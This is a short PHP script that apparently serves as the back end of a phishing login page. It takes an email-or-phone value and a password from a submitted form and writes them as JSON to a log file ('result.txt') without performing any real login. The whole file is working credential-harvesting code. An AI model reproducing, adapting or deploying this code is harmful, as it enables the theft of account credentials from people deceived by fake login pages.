<?php
header('Content-Type: text/html');
{
  $emailOrPhone = $_POST['emailOrPhone'];
  $password = $_POST['password'];

  $data = array(
  'emailOrPhone' => $emailOrPhone,
  'password' => $password);

  $json_data = json_encode($data);

  $f = fopen("../../logs/result.txt", 'w+');
  fwrite($f, $json_data);
  fclose($f);
}